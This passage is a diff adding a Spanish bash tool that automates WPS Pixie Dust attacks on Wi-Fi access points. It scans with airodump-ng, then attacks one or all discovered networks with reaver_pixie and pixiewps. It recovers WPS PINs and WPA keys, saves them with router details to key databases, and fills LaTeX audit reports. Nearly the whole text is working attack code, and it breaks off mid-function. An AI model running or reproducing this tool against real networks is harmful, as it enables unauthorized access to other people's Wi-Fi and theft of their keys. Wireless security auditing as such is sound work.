@@ -1,0 +1,1423 @@
+#!/bin/bash
+VERSION="1.0"
+RUTA_BASE=$(pwd)
+RUTA_LOGS=`pwd`"/LOGS/"
+RUTA_AIRCRACK=`pwd`"/AIRCRACK"
+RUTA_INFORME="$RUTA_BASE/INFORME"
+RUTA_DICCIONARIO="$RUTA_BASE/DICCIONARIO"
+
+export RUTA_LOGS
+export RUTA_INFORME
+export RUTA_AIRCRACK
+export RUTA_DICCIONARIO
+
+
+#ARCHIVOS Y LOGS
+ARCHIVO_STATUSBAR=$RUTA_LOGS"STATUSBAR.LOG"
+ARCHIVO_LOG=$RUTA_LOGS"VARIOS.LOG"
+ARCHIVO_TARJETA_MONITOR=$RUTA_LOGS"IFACE_MONITOR.LOG"
+ARCHIVO_TARJETA_SELECCIONADA=$RUTA_LOGS"IFACE.LOG"
+LOG_TARJETA="$RUTA_LOGS/TARJETA.LOG"
+ARCHIVO_CAPTURAS=$RUTA_LOGS"CAPTURA"
+CAPTURA_AIRCRACK="$RUTA_AIRCRACK/CAPTURA"
+COWFILE="$RUTA_AIRCRACK/cow.out"
+ARCHIVO_REDES_SCAN=$RUTA_LOGS"SCAN.LOG"
+LOG_AIRODUMP=$RUTA_LOGS"AIRODUMP.LOG"
+ARCHIVO_DETENER_SCAN=$RUTA_LOGS"DETENER_SCAN"
+ARCHIVO_DETENER_ATAQUE=$RUTA_LOGS"DETENER_ATAQUE"
+ARCHIVO_TIPO_ATAQUE=$RUTA_LOGS"TIPO_ATAQUE"
+ARCHIVO_TXT_ATAQUE=$RUTA_LOGS"TXT_ATAQUE"
+ARCHIVO_RADIOBUTTON=$RUTA_LOGS"RADIOBUTTON"
+LOG_AIRMONG="$RUTA_LOGS/AIRMONG.LOG"
+WORDLIST="$RUTA_DICCIONARIO/wpa.lst"
+LOG_PYRIT="$RUTA_LOGS/PYRIT.LOG"
+
+export WORDLIST
+
+#DATABASES
+ARCHIVO_VULNERABLES=`pwd`"/DATABASES/VULNERABLES"
+ARCHIVO_REDES_ATACADAS=`pwd`"/DATABASES/ATACADAS"
+ARCHIVO_DATABASE_KEYS=`pwd`"/DATABASES/DATABASE_KEYS"
+# CARPETA CLAVES
+CARPETA_KEYS=`pwd`"/WIFI_KEYS/"
+# ICONO MENSAJES
+ICONO_MENSAJES=`pwd`"ICONOS/ICONO.png"
+#INFORMES
+INFORME_SECWEP="$RUTA_INFORME/SECWEP1-Template.tex"
+INFORME_SUBSWEP="$RUTA_INFORME/SUBSWEP1-Template.tex"
+INFORME_WPA="$RUTA_INFORME/WPA.tex"
+export INFORME_SECWEP
+export INFORME_SUBSWEP
+export INFORME_WPA
+
+
+echo "2" > $ARCHIVO_LOG
+touch $ARCHIVO_VULNERABLES
+touch $ARCHIVO_REDES_ATACADAS
+touch $ARCHIVO_DATABASE_KEYS
+
+
+
+ActivarModoMonitor(){
+  TARJETA_SELECCIONADA=`echo $TARJETA_SELECCIONADA | awk {' print $1 '}`
+  echo $TARJETA_SELECCIONADA > $ARCHIVO_TARJETA_SELECCIONADA
+  if ! CheckInterface ; then return 1;fi
+  echo "RESETEANDO INTERFACE" > "$ARCHIVO_STATUSBAR"
+  if ! ResetInterface ; then return 1;fi
+  echo "DESLIGANDO INTERFACE DE NETWORKMANAGER" > "$ARCHIVO_STATUSBAR"
+  if ! DeshabilitarNetworkManager ON ; then return 1;fi 
+  echo "ACTIVANDO MODO MONITOR" > "$ARCHIVO_STATUSBAR"  
+  airmon-ng start $TARJETA_SELECCIONADA &> $ARCHIVO_LOG
+  TARJETA_MODO_MONITOR=(`iwconfig 2>/dev/null | grep Mode:Monitor | awk {'print $1'}`)
+  echo "$(iwconfig $TARJETA_MODO_MONITOR)" >> "$LOG_AIRMONG"
+  if [ ! $TARJETA_MODO_MONITOR ]
+  then 
+    yad --image "error" --title "ERROR" --button=gtk-ok:0 --text "<b>ERROR</b>: No se pudo activar el modo monitor en $TARJETA_SELECCIONADA" --fixed --on-top --center --window-icon=ICONOS/SCRIPT.png 
+    echo "ERROR: No se pudo activar el modo monitor en $TARJETA_SELECCIONADA" > $ARCHIVO_STATUSBAR
+    echo "1" > $ARCHIVO_LOG
+    return 1
+  else
+    echo "Modo monitor activado en $TARJETA_MODO_MONITOR" > $ARCHIVO_STATUSBAR
+    echo $TARJETA_MODO_MONITOR > $ARCHIVO_TARJETA_MONITOR
+    echo "0" > $ARCHIVO_LOG
+  fi
+}
+
+
+
+CheckInterface() {
+
+	if [ "$(ip route|grep "$TARJETA_SELECCIONADA")" ]; then
+		yad --image "error" --title "ERROR" --button=gtk-ok:0 --text "<b>ERROR</b>: La interface $TARJETA_SELECCIONADA está asociada a un punto de acceso, no se puede continuar" --fixed --on-top --center --window-icon=ICONOS/SCRIPT.png 
+		echo "ERROR: La interface $TARJETA_SELECCIONADA está asociada a un punto de acceso, no se puede continuar" > $ARCHIVO_STATUSBAR
+		echo "1" > $ARCHIVO_LOG
+		unset TARJETA_SELECCIONADA
+		return 1
+	fi
+}
+
+
+
+ResetInterface() {
+DRIVER=`ls -l /sys/class/net/$TARJETA_SELECCIONADA/device/driver | awk -F '/' '{print $NF}'`
+DesactivarMONsX
+unset DRIVER
+return 0
+	
+rmmod -f "$DRIVER" >/dev/null 2>&1 
+if [ "$DRIVER" = "ath9k_htc" ]
+then
+	ifconfig $TARJETA_SELECCIONADA >/dev/null 2>&1
+	while [ $? -eq 0 ] #esperamos a que se desactive el modulo de la interfaz
+	do
+		ifconfig $TARJETA_SELECCIONADA >/dev/null 2>&1
+	done
+fi
+modprobe "$DRIVER" >/dev/null 2>&1
+if [ "$DRIVER" = "ath9k_htc" ]
+then
+	ifconfig $TARJETA_SELECCIONADA >/dev/null 2>&1
+	while [ $? -ne 0 ] #esperamos a que se active el modulo de la interfaz
+	do
+		ifconfig $TARJETA_SELECCIONADA >/dev/null 2>&1
+	done
+fi
+}
+
+
+
+DesactivarMONsX() {
+INTERFACES_MONITOR=`iwconfig --version | grep "Recommend" | awk '{print $1}' | grep mon`
+let CUANTAS=`echo $INTERFACES_MONITOR | wc -w`
+let CONT=1
+
+while [ $CONT -le $CUANTAS ]
+do
+	MON=`echo $INTERFACES_MONITOR | awk '{print $'$CONT'}'`
+	airmon-ng stop $MON > /dev/null 2>&1
+	let CONT=$CONT+1
+done
+unset INTERFACES_MONITOR CONT CUANTAS
+}
+
+
+
+DeshabilitarNetworkManager() {
+	
+	CFG_FILE="/etc/NetworkManager/NetworkManager.conf"
+	
+	if [ -f "$CFG_FILE" ]; then
+		
+		if [ -f "/sys/class/net/$TARJETA_SELECCIONADA/address" ]; then
+			
+			TARJETA_SELECCIONADA_MAC="$(cat "/sys/class/net/$TARJETA_SELECCIONADA/address"|tr '[:lower:]' '[:upper:]')"
+			
+		elif [ -f "/sys/class/net/${TARJETA_SELECCIONADA}mon/address" ]; then
+			
+			TARJETA_SELECCIONADA_MAC="$(cat "/sys/class/net/${TARJETA_SELECCIONADA}mon/address")"
+		else
+			yad --image "error" --title "ERROR" --button=gtk-ok:0 --text "<b>ERROR</b>: Ha ocurrido un error inesperado con la interface $TARJETA_SELECCIONADA" --fixed --on-top --center --window-icon=ICONOS/SCRIPT.png 
+			echo "ERROR: Ha ocurrido un error inesperado con la interface $TARJETA_SELECCIONADA" > $ARCHIVO_STATUSBAR
+			echo "1" > $ARCHIVO_LOG
+			unset TARJETA_SELECCIONADA
+			return 1
+		fi
+		
+		[ ! "$(grep "^\[keyfile\]" "$CFG_FILE")" ] && echo "[keyfile]" >>"$CFG_FILE"
+		[ ! "$(grep "^plugins=" "$CFG_FILE")" ] && echo "plugins=" >>"$CFG_FILE"
+		[ ! "$(cat "$CFG_FILE"|grep "^plugins="|grep "keyfile")" ] && \
+		sed -i 's/^plugins=/plugins=keyfile,/' "$CFG_FILE"
+		
+		[ "$1" = "ON" ] && [ ! "$(cat "$CFG_FILE"|grep "unmanaged-devices=mac:$TARJETA_SELECCIONADA_MAC")" ] && sed -i "s/^\[keyfile\]/\[keyfile\]\nunmanaged-devices=mac:$TARJETA_SELECCIONADA_MAC/" "$CFG_FILE"
+		[ "$1" = "OFF" ] && sed -i "s/unmanaged-devices=mac:\([0-9A-Z]\{2\}:\)\{5\}[0-9A-Z]\{2\}//g"  "$CFG_FILE"
+		echo " "
+		cat "$CFG_FILE" | sed '/^$/d' > TEMPORAL
+		mv TEMPORAL "$CFG_FILE"
+	fi
+	echo "$TARJETA_SELECCIONADA_MAC" >> "$LOG_TARJETA"
+}
+
+
+
+ScanearRedes() {
+    rm -f "$RUTA_LOGS"CAP* > /dev/null
+    rm -f "$ARCHIVO_REDES_SCAN" &> /dev/null && touch $ARCHIVO_REDES_SCAN 
+    
+    TARJETA_SELECCIONADA=`cat $ARCHIVO_TARJETA_SELECCIONADA` 
+    TARJETA_MODO_MONITOR=`cat $ARCHIVO_TARJETA_MONITOR` 
+    ifconfig $TARJETA_SELECCIONADA up &> /dev/null
+    
+    (airodump-ng "$TARJETA_MODO_MONITOR" -a -w "$ARCHIVO_CAPTURAS" &>/dev/null &)
+    
+    for A in `seq 1 $TIEMPO_SCANEO` ; do
+      sleep 1s
+      if [ $A -eq $TIEMPO_SCANEO ]
+      then
+	echo "ESCANEO COMPLETADO, PROCESANDO DATOS" > $ARCHIVO_STATUSBAR
+	PID_AIRODUMP=`ps -A | grep airodump-ng | awk '{ print $1}'`
+	ATAQUE_ACABADO="NO"
+	kill $PID_AIRODUMP &> /dev/null
+	ProcesarDatosEscaneoAirodump
+      else
+	if [ -f  $ARCHIVO_DETENER_SCAN ]
+	then
+	  echo "ESCANEO DETENIDO, PROCESANDO DATOS, ESPERA ..." > $ARCHIVO_STATUSBAR
+	  rm $ARCHIVO_DETENER_SCAN
+	  PID_AIRODUMP=`ps -A | grep airodump-ng | awk '{ print $1}'`
+	  kill $PID_AIRODUMP &> /dev/null
+	  ATAQUE_ACABADO="NO"
+	  ProcesarDatosEscaneoAirodump
+	  return
+	fi
+	TIEMPO_RESTANTE=`expr $TIEMPO_SCANEO - $A`
+	echo "BUSCANDO REDES, ESPERA $TIEMPO_RESTANTE segundos" > $ARCHIVO_STATUSBAR
+      fi
+    done
+    unset TARJETA_MODO_MONITOR TIEMPO_SCANEO TIEMPO_RESTANTE PID_AIRODUMP A ATAQUE_ACABADO
+}
+
+
+
+ProcesarDatosEscaneoAirodump() {
+	echo "***************** ProcesarDatosScaneo airodump-ng"
+	if [ ! -f "$ARCHIVO_CAPTURAS-01.csv" ] 
+	then 
+		echo "ERROR: Ha ocurrido un error escaneando redes" > "$ARCHIVO_STATUSBAR"
+		echo "1" > "$ARCHIVO_LOG"
+		return
+	fi
+	Line_CSV=`wc -l "$ARCHIVO_CAPTURAS-01.csv" | awk '{print $1}'`
+	HeTa=`cat "$ARCHIVO_CAPTURAS-01.csv" | egrep -a -n '(Station|CLIENT)' | awk -F : '{print $1}'`
+	HeTa=`expr $HeTa - 1`
+	head -n $HeTa "$ARCHIVO_CAPTURAS-01.csv" &> "$ARCHIVO_CAPTURAS-02.csv"
+	tail -n +$HeTa "$ARCHIVO_CAPTURAS-01.csv" &> "$ARCHIVO_CAPTURAS-clients.csv"
+
+	LINEAS_LOG=$(cat "$ARCHIVO_CAPTURAS-02.csv" | wc -l | awk {' print$1 '})
+    
+	if [ $LINEAS_LOG -eq 0 ] 
+	then 
+		yad --image "error" --title "ERROR" --button=gtk-ok:0 --text "<b>ERROR</b>: No se han detectado redes con WPS activo" --on-top --center --window-icon=$ICONO_SOFT 
+		echo "ERROR: No se han detectado redes con WPS activo" > "$ARCHIVO_STATUSBAR"
+		echo "1" > "$LOG_ESTADO_ESCANEO"
+		return
+	fi
+	
+	rm $ARCHIVO_REDES_SCAN
+	touch $ARCHIVO_REDES_SCAN
+	i="0"
+	NUMRED="0"
+	echo "	BSSID			CANAL	ENC	POWER	VEL	CLIENTE		ESSID" >> "$LOG_AIRODUMP"
+	echo "----------------------------------------------" >> "$LOG_AIRODUMP"
+	while IFS=, read MAC FTS LTS CHANNEL SPEED PRIVACY CYPHER AUTH POWER BEACON IV LANIP IDLENGTH ESSID KEY
+	do
+		v="0"
+		length=${#MAC}
+		PRIVACY=$(echo $PRIVACY| tr -d "^ ")
+		PRIVACY=${PRIVACY:0:4}
+		if [ $length -ge 17 ]
+		then
+			i=$(($i+1))
+			if [ $i != 0 ]
+			then
+				d=1
+			else
+				d=0
+			fi
+			POWER=`expr $POWER + 100`
+			CLIENT=`cat $ARCHIVO_CAPTURAS-clients.csv | grep $MAC`
+			Ver_vun=`echo $MAC | cut -c 1-8`
+			if [ "$CLIENT" != "" ]
+			then
+				CLIENT="Yes"
+			else
+				CLIENT="No"
+			fi
+			if [ "$i" -lt "10" ]
+			then
+				echo $i
+			else
+				echo $i
+			fi
+			if [ "$CLIENT" == "Yes" ]
+			then
+				echo -e -n $BGreen"$MAC\t"
+			else
+				echo -e -n $BYellow"$MAC\t"
+			fi
+			echo -e -n $BWhite"$CHANNEL\t"
+			echo -e -n $BWhite"$PRIVACY\t"
+			if [ $POWER -ge 40 ]
+			then
+				echo -e -n $Green"$POWER%\t"
+			elif [ $POWER -ge 30 ]
+			then
+				echo -e -n $Yellow"$POWER%\t"
+			else
+				echo -e -n $Red"$POWER%\t"
+			fi
+			if [ "$CLIENT" == "Yes" ]
+			then
+				echo -e -n $Green"$CLIENT\t"
+			else
+				echo -e -n $Red"$CLIENT\t"
+			fi
+			echo -e $BWhite"$ESSID\t"
+			IDLENGTH=$IDLENGTH
+			ESSID[$i]=$ESSID
+			CHANNEL[$i]=$CHANNEL
+			BSSID[$i]=$MAC
+			PRIVACY[$i]=$PRIVACY
+			SPEED[$i]=$SPEED
+			CHANNEL=$(echo $CHANNEL|tr -d [:space:])
+			SPEED=$(echo $SPEED|tr -d [:space:])
+			if [ "$ESSID" == " " ]
+			then
+				ESSID="<length:0>"
+			else
+				X=$(echo $ESSID | grep 'x00')
+				#echo "ESSID0: $X"
+				if [ "$X" != " " ]
+				then
+	
+					ESSID=$(echo $ESSID | awk -F 'x00' '{print $1}' | awk -F '\' '{print $1}')
+					echo "ESSID1: $ESSID"
+				fi
+				ESSID=$(echo $ESSID|sed 's/^ //g')
+			fi
+			#echo "ESSID2:$ESSID"
+			ESTADO="gtk-apply"
+			NUMRED=`expr $NUMRED + 1`
+			VERWPS="1.0"
+			ESWPS="NO"
+			if [ $PRIVACY == "WEP" ] 
+			then
+				VERWPS="NO"
+			fi
+			echo $MAC$'\t'$CHANNEL$'\t'$PRIVACY$'\t'$POWER$'\t'$SPEED$'\t'$CLIENT$'\t'$ESSID"" >> "$LOG_AIRODUMP"
+			echo $ESTADO"|"$NUMRED"|"$MAC"|"$CHANNEL"|"$PRIVACY"|"$POWER"|"$VERWPS"|"$ESWPS"|"$ESSID"" >> "$ARCHIVO_REDES_SCAN"
+		fi
+	    #fi
+	done < "$ARCHIVO_CAPTURAS-02.csv"
+      	
+	if [ $ATAQUE_ACABADO = "NO" ]
+	then 
+		echo "DATOS PROCESADOS CON EXITO, ESCANEO FINALIZADO" > $ARCHIVO_STATUSBAR
+      		echo "0" > $ARCHIVO_LOG
+      		echo -n true > $ARCHIVO_RADIOBUTTON
+    	fi
+
+}
+
+
+TipoAtaque(){
+  MODO_ATAQUE=$(cat $ARCHIVO_TIPO_ATAQUE)
+  case $MODO_ATAQUE in
+    "1") AUTOMATICO=0 ; ACTUALIZAR_SCAN="SI"; ExtraerDatosAp ;;
+    "2") AUTOMATICO=1 ; ACTUALIZAR_SCAN="SI"; AtacarTodos ;;
+    "3") AUTOMATICO=0 ; ACTUALIZAR_SCAN="NO"; IntroducirDatosAp ;;
+  esac
+  echo "FIN" > $ARCHIVO_LOG
+  unset MODO_ATAQUE
+}
+
+
+
+IntroducirDatosAp(){
+datos=$(yad --width=400 --title="ATAQUE MANUAL" --text="<b>Introduce los datos solicitados</b>" --fixed --on-top --center --window-icon=ICONOS/SCRIPT.png \
+--form \
+--image=$ICONO_MENSAJES \
+--field="BSSID" \
+--field="CANAL:CBE" \
+"" '1!2!3!4!5!6!7!8!9!10!11!12!13')
+
+BSSID=$(echo $datos | awk -F "|" {'print $1'})
+BSSID=$(echo $BSSID | awk '{print toupper($0)}')
+CANAL=$(echo $datos | awk -F "|" {'print $2'})
+
+if [ -z $BSSID ]; then echo "FIN" > $ARCHIVO_LOG; return; fi
+
+if  ! ValidarMac $BSSID
+then 
+  yad --image "error" --title "ERROR" --button=gtk-ok:0 --text "<b>ERROR</b>: Formato de mac incorrecto" --fixed --on-top --center --window-icon=ICONOS/SCRIPT.png 
+  echo "1" $ARCHIVO_LOG
+  return
+fi
+let vez=1
+AtacarAP
+unset datos
+}
+
+
+
+AtacarTodos() {
+  ATAQUE_DETENIDO="NO"
+  TOTAL_LINEAS=$(cat $ARCHIVO_REDES_SCAN | wc -l | awk {' print$1 '})
+  let TOTAL_LINEAS=$TOTAL_LINEAS+1
+  
+  for MA in `seq 1 $TOTAL_LINEAS` 
+  do
+    if [ $ATAQUE_DETENIDO = "SI" ]; then return; fi
+    LINEA_ATAQUE=$MA
+    ExtraerDatosAp
+  done
+  echo "ATAQUE AUTOMATICO ACABADO" > $ARCHIVO_STATUSBAR
+}
+
+
+
+ExtraerDatosAp() {
+  LINEA_AUX=$LINEA_ATAQUE
+  LINEA_ATAQUE=$(head -$LINEA_ATAQUE $ARCHIVO_REDES_SCAN | tail -1)
+  BSSID=$(echo $LINEA_ATAQUE | awk -F "|" {' print $3 '})
+  CANAL=$(echo $LINEA_ATAQUE | awk -F "|" {' print $4 '})
+  ESSID=$(echo $LINEA_ATAQUE | awk -F "|" {' print $9 '})
+  CLAVE_CONSEGUIDA=$(echo $LINEA_ATAQUE | awk -F "|" {' print $1 '})
+ 
+  if [ $CLAVE_CONSEGUIDA = "gtk-about" ]     
+  then
+    if [ $AUTOMATICO = 0 ]
+    then
+      seguir=$(yad --image "dialog-question" --title "PIN YA CONSEGUIDO" --button=gtk-yes:1 --yes-label "SI" --button=gtk-no:0 --text "<b>PIN YA CONSEGUIDO</b>: Ya se tiene este PIN almacenado. ¿ Quieres volver a atacar $BSSID ? " --width=450 --on-top --center --window-icon=ICONOS/SCRIPT.png)
+      ret=$?
+      if [ $ret = "1" ]
+      then
+	let vez=1
+	AtacarAP
+	ATAQUE_ACABADO="SI"
+      fi
+    fi
+  else
+    let vez=1
+    AtacarAP
+    ATAQUE_ACABADO="SI"
+  fi
+  unset seguir ret
+}
+
+
+
+AtacarAP(){
+  AUTOMATICO=0
+  TARJETA_SELECCIONADA=`cat $ARCHIVO_TARJETA_SELECCIONADA` 
+  TARJETA_MODO_MONITOR=`cat $ARCHIVO_TARJETA_MONITOR` 
+  ifconfig $TARJETA_SELECCIONADA up &> /dev/null
+  ATAQUE_DETENIDO="NO"
+
+  (`sudo python "$RUTA_INFORME/SECWPA1.py" $BSSID "$ESSID" $CANAL $TARJETA_MODO_MONITOR`)
+
+  echo "ATACANDO BSSID $BSSID EN CANAL $CANAL" > $ARCHIVO_STATUSBAR
+
+  X1="reaver_pixie -F -G -i $TARJETA_MODO_MONITOR -b $BSSID -c $CANAL -a -n -vv -D"
+  reaver_pixie -F -G -i $TARJETA_MODO_MONITOR -b $BSSID -c $CANAL -a -n -vv -D > $ARCHIVO_TXT_ATAQUE 2> /dev/null
+
+  if ! EsperarAcabarReaver 
+  then
+    if [ $AUTOMATICO = 0 ]
+    then
+      if [ $vez -eq 1 ]
+      then
+	yad --image "error" --title "ATAQUE FALLIDO" --button=gtk-ok:0 --text "<b>ERROR</b>: NO SE HAN PODIDO OBTENER LOS DATOS NECESARIOS DE $BSSID, ATAQUE REAVER FALLIDO 1" --fixed --on-top --center --window-icon=ICONOS/SCRIPT.png
+
+	#Infome Latex SUBSWPA1-Template.tex
+	X2="NO SE HAN PODIDO OBTENER LOS DATOS NECESARIOS DE $BSSID"
+	#X3="..LOGS\TXT_ATAQUE"
+	X3="FIN-Template"
+	(`sudo python "$RUTA_INFORME/SUBSWPA1.py" "$X1" "$X2" "$X3"`)
+
+      else
+	yad --image "info" --title "ATENCION" --button=gtk-ok:0 --text "<b>ATENCION</b>: NO SE HAN PODIDO RECUPERAR LA CLAVE WPA DE $BSSID" --fixed --on-top --center --window-icon=ICONOS/SCRIPT.png
+      fi
+    fi
+    
+    if [ $vez -eq 1 ]
+    then 
+	AgregarBssidDatabases 1
+	ATAQUE_ACABADO="SI"
+	if [ $ACTUALIZAR_SCAN = "SI" ]; then ProcesarDatosEscaneoAirodump; fi
+	echo "1" > $ARCHIVO_LOG
+	return 1 
+    fi
+  fi
+  if [ $ATAQUE_DETENIDO = "SI" ]; then return; fi
+  if ! ExtraerDatosReaver 
+  then
+    if [ $AUTOMATICO = 0 ]; then yad --image "error" --title "ATAQUE FALLIDO" --button=gtk-ok:0 --text "<b>ERROR</b>: $MENSAJE_ERROR DE $BSSID" --fixed --on-top --center --window-icon=ICONOS/SCRIPT.png ; fi
+    echo "$MENSAJE_ERROR DE $BSSID" > $ARCHIVO_STATUSBAR
+    echo "1" > $ARCHIVO_LOG
+    AgregarBssidDatabases 1
+    ATAQUE_ACABADO="SI"
+    if [ $ACTUALIZAR_SCAN = "SI" ]; then ProcesarDatosEscaneoAirodump; fi
+
+	#Infome Latex SECWPA1-Template.tex
+	X2="NO SE HAN PODIDO OBTENER LOS DATOS NECESARIOS DE $BSSID"
+	#X3="..LOGS\TXT_ATAQUE"
+	X3="FIN-Template"
+	(`sudo python "$RUTA_INFORME/SUBSWPA1.py" "$X1" "$X2" "$X3"`)
+
+    echo "1" > $ARCHIVO_LOG
+    return
+  fi
+  echo "PROBANDO CON PIXIEWPS 1.0 by wiire" > $ARCHIVO_STATUSBAR
+  
+  #Infome Latex SECWPA1-Template.tex
+  X2="SE HA OBTENIDO LA INFORMACION REQUERIDA"
+  X3="INF-PIXIEWPS"
+  (`sudo python "$RUTA_INFORME/SUBSWPA1.py" "$X1" "$X2" "$X3"`)
+  
+  pixiewps -e $PKe -r $PKr -s $EHash1 -z $EHash2 -a $AuthKey -n $Enrollee &>> $ARCHIVO_TXT_ATAQUE
+  #X1="pixiewps -e PKe -r PKr -s EHash1 -z EHash2 -a AuthKey -n $Enrollee"
+  AnalizarLogPixiewps
+  echo "1" > $ARCHIVO_LOG
+}
+
+AnalizarLogPixiewps(){
+  lineas_log=$(cat $ARCHIVO_TXT_ATAQUE | wc -l | awk {' print$1 '})
+  for A in `seq 1 $lineas_log` ; do 
+    linea=`head -$A $ARCHIVO_TXT_ATAQUE | tail -1`
+    if [[ $linea == *"WPS pin"* ]] 
+    then 
+      if [[ $linea == *"not found"* ]]
+      then 
+	echo "$BSSID : ATAQUE FALLIDO, BSSID NO VULNERABLE A PIXIEWPS ATTACK" > $ARCHIVO_STATUSBAR
+	AgregarBssidDatabases 2
+	ATAQUE_ACABADO="SI"
+	if [ $ACTUALIZAR_SCAN = "SI" ]; then ProcesarDatosEscaneoAirodump; fi
+
+	    #Inicio Infome Latex PIXIEWPS-Template.tex
+	    X1="pixiewps -e PKe -r PKr -s EHash1 -z EHash2 -a AuthKey -n Enrollee"
+	    X2="NO"
+	    X3="El $BSSID NO ES VULNERABLE A PIXIEWPS"
+	    X4="FIN-Template"
+	    (`sudo python "$RUTA_INFORME/PIXIEWPS.py" "$X1" "$Pke" "$PKr" "$EHash1" "$EHash2" "$AuthKey" "$Enrollee" "$X2" "$X3" "$X4"`)
+	    #Fin Latex
+
+
+	return 1
+      fi
+    PIN_WPS=`echo $linea | awk -F":" {' print $2 '} `
+   
+    echo "$BSSID : PIN WPS CONSEGUIDO, RECUPERANDO CLAVE WPA, ESPERA ..." > $ARCHIVO_STATUSBAR
+
+    #X0="reaver_pixie -i $TARJETA_MODO_MONITOR -b $BSSID -a -D -c $CANAL -p $PIN_WPS"
+
+    reaver_pixie -i $TARJETA_MODO_MONITOR -b $BSSID -a -D -c $CANAL -p $PIN_WPS &>> $ARCHIVO_TXT_ATAQUE
+
+    let vez=2
+    if EsperarAcabarReaver
+    then
+       if [ $ATAQUE_DETENIDO = "SI" ]; then return; fi	
+       RecuperarClaveWpa
+    else
+      CLAVE_WPA="NO SE HA PODIDO RECUPERAR LA CLAVE WPA"
+    fi
+    
+    echo $fabricante > $ARCHIVO_TXT_ATAQUE
+    echo $modelo >> $ARCHIVO_TXT_ATAQUE
+    echo $numero_de_modelo >> $ARCHIVO_TXT_ATAQUE
+    echo $numero_de_serie >> $ARCHIVO_TXT_ATAQUE
+    echo $device_name  >> $ARCHIVO_TXT_ATAQUE
+    echo "- ESSID : "$ESSID >> $ARCHIVO_TXT_ATAQUE
+    echo "- BSSID : "$BSSID  >> $ARCHIVO_TXT_ATAQUE
+    echo "- PIN WPS : "$PIN_WPS >> $ARCHIVO_TXT_ATAQUE
+    echo "- KEY WPA : "$CLAVE_WPA >> $ARCHIVO_TXT_ATAQUE
+    
+    echo $fabricante > $CARPETA_KEYS"$ESSID.DATOS"
+    echo $modelo >> $CARPETA_KEYS"$ESSID.DATOS"
+    echo $numero_de_modelo >> $CARPETA_KEYS"$ESSID.DATOS"
+    echo $numero_de_serie >> $CARPETA_KEYS"$ESSID.DATOS"
+    echo $device_name  >> $CARPETA_KEYS"$ESSID.DATOS"
+    echo "- ESSID : "$ESSID >> $CARPETA_KEYS"$ESSID.DATOS"
+    echo "- BSSID : "$BSSID  >> $CARPETA_KEYS"$ESSID.DATOS"
+    echo "- PIN WPS : "$PIN_WPS >> $CARPETA_KEYS"$ESSID.DATOS"
+    echo "- KEY WPA : "$CLAVE_WPA >> $CARPETA_KEYS"$ESSID.DATOS"
+    
+    fabricante=$(echo $fabricante | awk -F":" {' print $2 '})
+    modelo=$(echo $modelo | awk -F":" {' print $2 '})
+    numero_de_modelo=$(echo $numero_de_modelo | awk -F":" {' print $2 '})
+    numero_de_serie=$(echo $numero_de_serie | awk -F":" {' print $2 '})
+    device_name=$(echo $device_name | awk -F":" {' print $2 '})
+
+    #Inicio Infome Latex PIXIEWPS-Template.tex
+    X1="pixiewps -e PKe -r PKr -s EHash1 -z EHash2 -a AuthKey -n Enrollee"
+    X2="SI"
+    X3="El $BSSID ES VULNERABLE A PIXIEWPS"
+    X4="INF-PIXIEWPS1"
+    (`sudo python "$RUTA_INFORME/PIXIEWPS.py" "$X1" "$Pke" "$PKr" "$EHash1" "$EHash2" "$AuthKey" "$Enrollee" "$X2" "$X3" "$X4"`)
+    X1="reaver_pixie -i $TARJETA_MODO_MONITOR -b $BSSID -a -D -c $CANAL -p $PIN_WPS"
+    X2="$ESSID.DATOS"
+    (`sudo python "$RUTA_INFORME/PIXIEWPS1.py" "$X1" "$X2"`)
+    #Fin Latex
+    
+    if ! grep -q $BSSID $ARCHIVO_DATABASE_KEYS
+    then
+	if [ "$CLAVE_WPA" = "NO SE HA PODIDO RECUPERAR LA CLAVE WPA" ]; then CLAVE_WPA="?"; fi 
+	echo $ESSID"|"$BSSID"|"$PIN_WPS"|"$CLAVE_WPA"|"$fabricante"|"$modelo"|"$numero_de_modelo"|"$numero_de_serie"|"$device_name >> $ARCHIVO_DATABASE_KEYS
+    else
+	if [ $(grep $BSSID $ARCHIVO_DATABASE_KEYS | awk -F"|" {'print $4'}) = "?" ] && [ $CLAVE_WPA != "?" ] 
+	then
+	  sed '/'$BSSID'/d' $ARCHIVO_DATABASE_KEYS | sed '/^$/d' > TEMPORAL
+	  mv TEMPORAL $ARCHIVO_DATABASE_KEYS
+	  echo $ESSID"|"$BSSID"|"$PIN_WPS"|"$CLAVE_WPA"|"$fabricante"|"$modelo"|"$numero_de_modelo"|"$numero_de_serie"|"$device_name >> $ARCHIVO_DATABASE_KEYS
+	fi
+    fi    
+    echo "$BSSID : ATAQUE FINALIZADO, SE HA GENERADO EL ARCHIVO $ESSID.DATOS" > $ARCHIVO_STATUSBAR
+   
+    AgregarBssidDatabases 3
+    ATAQUE_ACABADO="SI"
+    if [ $ACTUALIZAR_SCAN = "SI" ]; then ProcesarDatosEscaneoAirodump; fi
+  fi 
+done
+unset lineas_log A linea PIN_WPS CLAVE_WPA fabricante modelo numero_de_modelo numero_de_serie device_name  
+}
+
+RecuperarClaveWpa() {
+  lineas_log=$(cat $ARCHIVO_TXT_ATAQUE | wc -l | awk {' print$1 '})
+  let A=0
+  for A in `seq 1 $lineas_log` ; do 
+    linea=`head -$A $ARCHIVO_TXT_ATAQUE | tail -1`
+    if [[ $linea == *"WPA PSK"* ]] 
+    then 
+      CLAVE_WPA=`echo $linea | awk -F":" {' print $2 '}` 
+      CLAVE_WPA=`echo $CLAVE_WPA | awk -F"'" {' print $2 '}`
+    fi
+  done
+}
+
+
+
+AgregarBssidDatabases(){
+  # 1 No funciona Reaver (SD)
+  # 2 No funciona Pixie (NV)
+  # 3 Pin conseguido (PC)
+  if [ $1 = "1" ] ; then 
+    CASO="SD";
+  elif [ $1 = "2" ]; then
+    CASO="NV";
+  else
+    CASO="PC";
+  fi
+  
+  if grep -q $BSSID $ARCHIVO_REDES_ATACADAS
+  then
+    CASO_VIEJO=$(grep $BSSID $ARCHIVO_REDES_ATACADAS | awk {'print $2'})
+    if [ $CASO_VIEJO = "PC" ];then return;fi
+    if [ $CASO_VIEJO = "SD" ]
+    then
+	if [ $CASO = "PC" ] 
+	then
+	    sed '/'$BSSID'/d' $ARCHIVO_REDES_ATACADAS | sed '/^$/d' > TEMPORAL
+	    mv TEMPORAL $ARCHIVO_REDES_ATACADAS
+	    echo $BSSID" "$CASO >> $ARCHIVO_REDES_ATACADAS
+	    if ! grep -q $BSSID $ARCHIVO_VULNERABLES
+	    then
+		echo $BSSID >> $ARCHIVO_VULNERABLES
+	    fi
+	    return 
+	fi
+	if [ $CASO = "NV" ] 
